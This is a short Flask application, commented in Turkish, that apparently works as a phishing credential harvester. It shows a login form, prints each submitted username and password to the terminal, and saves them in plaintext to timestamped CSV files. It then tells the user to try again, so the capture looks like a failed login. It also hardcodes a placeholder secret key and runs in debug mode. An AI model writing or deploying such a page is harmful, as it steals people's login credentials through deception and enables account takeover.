from flask import Flask, render_template, request, redirect, url_for, flash
import pandas as pd
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "dev-secret-change-this"

SAVE_DIR = os.path.join(os.path.dirname(__file__), "saved")
os.makedirs(SAVE_DIR, exist_ok=True)

@app.route("/", methods=["GET"])
def login_page():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login_save():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()

    if not username or not password:
        flash("Tüm alanları doldurun!")
        return redirect(url_for("login_page"))

    # Terminalde kullanıcı adı ve şifreyi göster
    print(f"[GİRİŞ] Kullanıcı: {username} | Şifre: {password}")

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S")
    filename = os.path.join(SAVE_DIR, f"login_data_{timestamp}.csv")

    df = pd.DataFrame([{"username": username, "password": password, "saved_at_utc": datetime.utcnow()}])
    df.to_csv(filename, index=False, encoding="utf-8-sig")

    flash("Lütfen tekrar deneyin.")
    return redirect(url_for("login_page"))

if __name__ == "__main__":
    app.run(debug=True)
